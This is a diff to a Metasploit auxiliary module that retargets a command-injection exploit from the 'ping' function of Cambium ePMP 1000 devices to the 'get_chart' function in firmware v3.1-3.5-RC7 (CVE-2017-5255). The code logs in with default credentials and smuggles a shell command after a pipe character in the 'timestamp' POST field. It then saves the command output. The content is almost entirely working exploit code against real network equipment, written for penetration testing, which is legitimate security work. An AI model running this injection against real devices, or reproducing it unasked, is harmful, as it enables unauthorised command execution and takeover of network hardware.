@@ -8,21 +8,21 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name' => "Cambium ePMP 1000 'ping' Command Injection (up to v2.5)",
+      'Name' => "Cambium ePMP 1000 'get_chart' Command Injection (v3.1-3.5-RC7)",
       'Description' => %{
           This module exploits an OS Command Injection vulnerability in Cambium
-          ePMP 1000 (<v2.5) device management portal. It requires any one of the
+          ePMP 1000 (v3.1-3.5-RC7) device management portal. It requires any one of the
           following login credentials - admin/admin, installer/installer, home/home - to
           execute arbitrary system commands.
       },
-      'References' =>
-        [
-          ['URL', 'http://ipositivesecurity.com/2015/11/28/cambium-epmp-1000-multiple-vulnerabilities/'],
-          ['URL', 'https://support.cambiumnetworks.com/file/476262a0256fdd8be0e595e51f5112e0f9700f83']
-        ],
       'Author' =>
         [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
+        ],
+      'References' =>
+        [
+          ['CVE', '2017-5255'],
+          ['URL', 'https://blog.rapid7.com/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities']
         ],
       'License' => MSF_LICENSE
      )
@@ -49,7 +49,7 @@ class MetasploitModule < Msf::Auxiliary
   # Command Execution
   def cmd_exec(config_uri, cookie)
     command = datastore['CMD']
-    inject = '|' + "#{command}" + ' ||'
+    inject = '|' + "#{command}"
     clean_inject = CGI.unescapeHTML(inject.to_s)
 
     print_status("#{rhost}:#{rport} - Executing #{command}")
@@ -61,18 +61,15 @@ class MetasploitModule < Msf::Auxiliary
         'headers' => {
           'Accept' => '*/*',
           'Accept-Language' => 'en-US,en;q=0.5',
-          'Accept-Encoding' => 'gzip, deflate',
+          'Content-Encoding' => 'application/x-www-form-urlencoded; charset=UTF-8',
           'X-Requested-With' => 'XMLHttpRequest',
-          'ctype' => '*/*',
           'Connection' => 'close'
         },
         'vars_post' =>
           {
-            'ping_ip' => '8.8.8.8', # This parameter can also be used for injection
-            'packets_num' => clean_inject,
-            'buf_size' => 0,
-            'ttl' => 1,
-            'debug' => '0'
+            'measure' => 's', # This parameter can also be used for injection
+            'timestamp' => clean_inject,
+            'debug' => 0
           }
       }, 25
     )
@@ -84,9 +81,9 @@ class MetasploitModule < Msf::Auxiliary
 
     if good_response
       path = store_loot('ePMP_cmd_exec', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 Command Exec Results')
-      print_status("#{rhost}:#{rport} - File saved in: #{path}")
+      print_status("#{rhost}:#{rport} - Results saved in: #{path}")
     else
-      print_error("#{rhost}:#{rport} - Failed to execute command.")
+      print_error("#{rhost}:#{rport} - Failed to execute command(s).")
     end
   end
 
@@ -95,15 +92,23 @@ class MetasploitModule < Msf::Auxiliary
   #
 
   def do_login(epmp_ver)
-    if epmp_ver < '2.5' # <3.4.1 uses login_1
-      cookie, _blah1, _blah2, _blah3, config_uri_ping = login_1(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)
-      if cookie == 'skip' && config_uri_ping == 'skip'
+    if (epmp_ver < '3.1' || epmp_ver > '3.5' && epmp_ver != '3.5-RC7')
+      print_error('This module is applicable to versions 3.1-3.5-RC7 only. Exiting now.')
+      return
+    elsif (epmp_ver >= '3.1' && epmp_ver < '3.4.1') # <3.4.1 uses login_1
+      cookie, _blah1, _blah2, config_uri_get_chart = login_1(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)
+      if cookie == 'skip' && config_uri_get_chart == 'skip'
         return
       else
-        cmd_exec(config_uri_ping, cookie)
+        cmd_exec(config_uri_get_chart, cookie)
       end
-    else
-      print_error('This ePMP version is not vulnerable. Module will not continue.')
+    elsif ['3.4.1', '3.5', '3.5-RC7'].include?(epmp_ver) # 3.4.1+ uses login_2
+      cookie, _blah1, _blah2, config_uri_get_chart = login_2(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)
+      if cookie == 'skip' && config_uri_get_chart == 'skip'
+        return
+      else
+        cmd_exec(config_uri_get_chart, cookie)
+      end
     end
   end
 end
